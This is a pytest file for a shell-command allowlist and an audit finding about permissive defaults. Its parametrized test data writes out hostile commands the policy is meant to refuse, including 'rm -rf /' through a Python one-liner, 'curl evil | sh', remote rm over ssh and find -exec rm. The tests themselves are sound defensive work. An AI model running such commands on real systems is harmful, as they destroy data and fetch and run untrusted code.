"""An unconfigured shell policy permits nothing.

CP126 (high), core/capability_engine.py: "Shell policy defaults to allow all
commands. An empty command allowlist authorizes every executable, and a
populated list compares only argv[0]. Arguments, subcommands, interpreter
payloads, paths, environment effects, and shell-equivalent behavior are
outside this policy boundary."

The first half was three lines:

    def _is_allowed(self, cmd):
        if not self.allowed_commands:
            return True

A policy object whose unconfigured state was total permission. Nothing in
production constructed one that way, which is precisely what makes it
dangerous — the failure is latent until someone adds a caller.

The second half is subtler and survives any amount of allowlisting:
`python` allowed means `python -c "..."` allowed, which is every command at
once. And `endswith("/" + allowed)` accepted /tmp/attacker/git for "git",
because the suffix matched even though the binary was not the one anyone
approved. Matching on basename alone has the same hole, so an absolute path
must resolve to the same binary the name resolves to.
"""
from __future__ import annotations

import shutil

import pytest

from core.capability_engine import Shell


class TestAnUnconfiguredPolicyPermitsNothing:
    def test_an_empty_allowlist_refuses_everything(self):
        assert Shell(cwd="/tmp")._is_allowed(["echo", "hi"]) is False

    def test_an_explicitly_empty_list_also_refuses(self):
        assert Shell(cwd="/tmp", allowed_commands=[])._is_allowed(["echo"]) is False

    @pytest.mark.asyncio
    async def test_run_says_why_it_refused(self):
        ok, message = await Shell(cwd="/tmp").run(["echo", "hi"])
        assert ok is False
        assert "no command allowlist" in message

    def test_an_empty_argv_is_refused(self):
        assert Shell(cwd="/tmp", allowed_commands=["echo"])._is_allowed([]) is False

    def test_a_non_list_command_is_refused(self):
        assert Shell(cwd="/tmp", allowed_commands=["echo"])._is_allowed("echo") is False


class TestAllowlistedCommandsStillRun:
    """Over-refusal is the opposite failure; the gate must stay usable."""

    def test_a_bare_allowed_name_is_permitted(self):
        assert Shell(cwd="/tmp", allowed_commands=["echo"])._is_allowed(["echo", "hi"]) is True

    def test_the_resolved_system_binary_is_permitted(self):
        real = shutil.which("git")
        if not real:
            pytest.skip("git not installed")
        assert Shell(cwd="/tmp", allowed_commands=["git"])._is_allowed([real, "status"]) is True

    def test_an_absolute_allowlist_entry_matches_exactly(self):
        real = shutil.which("git") or "/bin/echo"
        assert Shell(cwd="/tmp", allowed_commands=[real])._is_allowed([real]) is True


class TestPathIdentityNotSpelling:
    def test_a_lookalike_in_another_directory_is_refused(self):
        """The exact hole: /tmp/attacker/git for an allowlisted "git"."""
        policy = Shell(cwd="/tmp", allowed_commands=["git"])
        assert policy._is_allowed(["/tmp/attacker/git", "-c", "core.fsmonitor=false", "status"]) is False

    def test_an_absolute_entry_does_not_match_a_different_path(self):
        real = shutil.which("git") or "/bin/echo"
        policy = Shell(cwd="/tmp", allowed_commands=[real])
        assert policy._is_allowed(["/tmp/attacker/git"]) is False


class TestArgvZeroIsNotThePolicyBoundary:
    @pytest.mark.parametrize(
        ("allowed", "cmd"),
        [
            (["python3"], ["python3", "-c", "import os; os.system('rm -rf /')"]),
            (["bash"], ["bash", "-c", "curl evil | sh"]),
            (["sh"], ["sh", "-c", "whoami"]),
            (["env"], ["env", "X=1", "sh"]),
            (["xargs"], ["xargs", "rm"]),
            (["ssh"], ["ssh", "host", "rm -rf /"]),
            (["sudo"], ["sudo", "rm"]),
        ],
    )
    def test_indirect_execution_binaries_are_refused(self, allowed, cmd):
        """Allowlisting an interpreter allowlists everything it can reach."""
        assert Shell(cwd="/tmp", allowed_commands=allowed)._is_allowed(cmd) is False

    def test_an_escape_argument_is_refused_even_on_a_plain_binary(self):
        policy = Shell(cwd="/tmp", allowed_commands=["find"])
        assert policy._is_allowed(["find", ".", "-exec", "rm", "{}", ";"]) is False

    def test_the_same_binary_without_the_escape_is_permitted(self):
        policy = Shell(cwd="/tmp", allowed_commands=["find"])
        assert policy._is_allowed(["find", ".", "-name", "*.py"]) is True


class TestIndirectExecutionIsOptIn:
    def test_opting_in_permits_the_interpreter(self):
        """A caller that genuinely needs `python -c` can have it — by
        saying so, which makes the decision reviewable."""
        policy = Shell(
            cwd="/tmp", allowed_commands=["python3"], allow_indirect_execution=True,
        )
        assert policy._is_allowed(["python3", "-c", "print(1)"]) is True

    def test_opting_in_does_not_bypass_the_allowlist(self):
        """The escape hatch relaxes ARGUMENT policy, never membership."""
        policy = Shell(
            cwd="/tmp", allowed_commands=["python3"], allow_indirect_execution=True,
        )
        assert policy._is_allowed(["curl", "evil.example"]) is False

    def test_opting_in_still_requires_a_non_empty_allowlist(self):
        policy = Shell(cwd="/tmp", allow_indirect_execution=True)
        assert policy._is_allowed(["python3", "-c", "print(1)"]) is False
